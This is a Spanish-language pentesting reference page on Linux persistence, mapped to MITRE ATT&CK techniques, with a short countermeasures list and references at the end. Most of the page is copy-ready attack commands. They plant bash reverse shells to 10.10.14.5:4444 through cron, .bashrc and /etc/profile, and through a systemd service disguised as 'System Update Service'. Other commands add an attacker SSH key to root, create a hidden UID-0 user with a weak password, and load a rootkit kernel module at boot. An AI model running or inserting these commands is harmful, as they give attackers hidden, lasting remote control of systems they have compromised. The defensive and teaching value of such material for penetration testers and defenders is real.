# Persistencia en Linux

## Descripción
La persistencia en Linux se refiere al conjunto de técnicas que un atacante utiliza para mantener el acceso a un sistema comprometido a través de reinicios, cambios de contraseña o actualizaciones de seguridad. Los mecanismos más comunes incluyen la manipulación de cron jobs para ejecutar backdoors periódicamente, la adición de claves SSH autorizadas para acceso sin contraseña, la modificación de scripts de inicio del sistema (init, systemd), la inserción de comandos en archivos de perfil del usuario (.bashrc, .profile), y la carga de módulos maliciosos en el kernel. La efectividad de cada técnica depende del nivel de acceso obtenido y de las medidas de monitoreo implementadas en el sistema.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1053.003 (Scheduled Task/Job: Cron); T1098.004 (Account Manipulation: SSH Authorized Keys); T1547.006 (Boot or Logon Autostart Execution: Kernel Modules and Extensions); T1546.004 (Event Triggered Execution: Unix Shell Configuration Modification)
- **Plataforma**: Linux
- **Dificultad**: Intermedia

## Herramientas
- **crontab** — creación de tareas periódicas para ejecutar backdoors
- **ssh-keygen** — generación de pares de claves para persistencia vía SSH
- **insmod** / **modprobe** — carga de módulos de kernel maliciosos
- **systemctl** — creación de servicios systemd persistentes
- **msfvenom** (`-p linux/x64/shell_reverse_tcp`) — generación de payloads para backdoors persistentes

## Comandos / Ejemplos

### Persistencia vía cron jobs
```bash
# Añadir reverse shell al crontab del usuario actual
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Crear script de backdoor y programar en cron del sistema (requiere root)
echo '#!/bin/bash' > /opt/.backdoor.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/.backdoor.sh
chmod +x /opt/.backdoor.sh
echo "*/10 * * * * root /opt/.backdoor.sh" >> /etc/crontab

# Persistencia en directorio cron.d (más sigiloso)
echo "*/5 * * * * root /opt/.backdoor.sh" > /etc/cron.d/.system-update
```

### Persistencia vía SSH Authorized Keys
```bash
# En la máquina del atacante: generar par de claves
ssh-keygen -t ed25519 -f ~/.ssh/persistence_key -N ""

# Añadir clave pública al usuario víctima
mkdir -p /home/target_user/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /home/target_user/.ssh/authorized_keys
chmod 700 /home/target_user/.ssh
chmod 600 /home/target_user/.ssh/authorized_keys

# Persistencia como root
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys

# Conectar desde el atacante
ssh -i ~/.ssh/persistence_key target_user@10.10.10.50
```

### Persistencia vía archivos de perfil de shell
```bash
# Inyectar en .bashrc del usuario (se ejecuta al abrir bash)
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &' >> /home/target_user/.bashrc

# Inyectar en .profile (se ejecuta al iniciar sesión)
echo 'nohup /opt/.backdoor.sh &' >> /home/target_user/.profile

# Inyectar en /etc/profile (afecta a TODOS los usuarios)
echo '/opt/.backdoor.sh &' >> /etc/profile

# Inyectar en archivos rc de bash globales
echo '/opt/.backdoor.sh &' >> /etc/bash.bashrc
```

### Persistencia vía servicios systemd
```bash
# Crear servicio systemd malicioso (requiere root)
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Habilitar e iniciar el servicio
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

### Persistencia vía módulos del kernel
```bash
# Compilar módulo de kernel malicioso (requiere headers del kernel)
# El módulo puede ejecutar código con privilegios de kernel al cargarse

# Cargar módulo
insmod rootkit.ko

# Verificar módulos cargados
lsmod | grep rootkit

# Persistencia automática al arranque
echo "rootkit" >> /etc/modules
# O crear archivo en /etc/modules-load.d/
echo "rootkit" > /etc/modules-load.d/rootkit.conf
```

### Persistencia vía usuario oculto
```bash
# Añadir usuario con UID 0 (acceso root)
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd

# Crear usuario más sigiloso (con nombre que parezca de sistema)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate
echo "sysupdate:Password123" | chpasswd
```

## Contramedidas
- Monitorear cambios en `/etc/crontab`, `/etc/cron.d/`, y crontabs de usuarios con herramientas de integridad (AIDE, OSSEC, Tripwire)
- Auditar cambios en archivos `authorized_keys` y restringir su modificación con `chattr +i`
- Implementar monitoreo de archivos de perfil (.bashrc, .profile, /etc/profile) para detectar inyecciones
- Usar `auditd` para registrar modificaciones en archivos críticos del sistema
- Verificar periódicamente cuentas con UID 0 y cuentas sin contraseña en `/etc/passwd`
- Monitorear carga de módulos del kernel con `auditd` (regla para `init_module` y `finit_module`)
- Restringir acceso SSH con `AllowUsers`/`AllowGroups` y deshabilitar autenticación por contraseña cuando sea posible
- Revisar servicios systemd personalizados y verificar que solo existan los esperados

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1053.003: Scheduled Task/Job: Cron. https://attack.mitre.org/techniques/T1053/003/
- MITRE Corporation. (2024). ATT&CK Technique T1098.004: Account Manipulation: SSH Authorized Keys. https://attack.mitre.org/techniques/T1098/004/
- MITRE Corporation. (2024). ATT&CK Technique T1547.006: Boot or Logon Autostart Execution: Kernel Modules and Extensions. https://attack.mitre.org/techniques/T1547/006/
- Allen, L. (2018). *Mastering Kali Linux for Advanced Penetration Testing* (2nd ed.). Packt Publishing.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
